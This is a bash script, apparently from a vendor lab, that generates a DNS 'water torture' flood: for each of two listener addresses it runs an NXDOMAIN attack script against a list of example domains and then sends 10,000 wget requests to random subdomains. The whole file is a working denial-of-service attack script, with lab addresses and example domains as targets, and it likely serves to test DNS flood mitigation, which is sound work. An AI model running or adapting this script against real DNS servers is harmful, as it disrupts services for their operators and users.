#!/bin/bash
# DNS WATER TORTURE with WGET

#!/bin/bash
# Uncomment set command below for code debuging bash
# set -x

home="/home/f5/scripts"

already=$(ps -ef | grep "$0" | grep bash | grep -v grep | wc -l)
if [  $already -gt 2 ]; then
    echo "The script is already running `expr $already - 2` time."
    exit 1
fi

sitelistener[1]="10.1.10.203"
sitelistener[2]="10.1.10.204"

widip[1]="site36.example.com A"
widip[2]="f5.udf.example.com A"
widip[3]="office.example.com A"
widip[4]="hr.example.com A"
widip[5]="pm.example.com A"
widip[6]="accounting.example.com A"
widip[7]="www.example.com A"
widip[8]="notthere.example.com A"
widip[9]="site40.example.com A"
widip[10]="site42.example.com A"
widip[11]="site38.example.com A"
widip[12]="site36.example.com A"
widip[13]="canonical.example.com CNAME"
widip[14]="mail.example.com MX"

# get length of the array
arraylength=${#sitelistener[@]}
arraylength2=${#widip[@]}

for (( i=1; i<${arraylength}+1; i++ ));
do
    if [ ! -z "${sitelistener[$i]}" ]; then
        # test of listener is responding
        dig @${sitelistener[$i]}
        if [  $? == 0 ]; then
             # Build dns target file and do dig
            for (( j=1; j<${arraylength2}+1; j++ ));
            do
                echo -e "\n# site $i ${sitelistener[$i]} ${widip[$j]} dnstargets.txt"
                echo ${widip[$j]} >> $home/dnstargets.txt
                wip=$(echo ${widip[$j]} | awk '{print $1}')
                dig @${sitelistener[$i]} $wip
                python attack_dns_nxdomain.py ${sitelistener[$i]} $wip 1000
                python attack_dns_nxdomain.py ${sitelistener[$i]} $wip 1000
            done
            echo -e "\n# site $i ${sitelistener[$i]} dnsperf"
            for (( c=1; c<=10000; c++ ));
            do
                  wget -O /dev/null $RANDOM.${sitelistener[$i]}
            done

            

        else
            echo "SKIP ${sitelistener[$i]} - not answering on port 53"
        fi
   fi
done

rm -f $home/dnstargets.txt



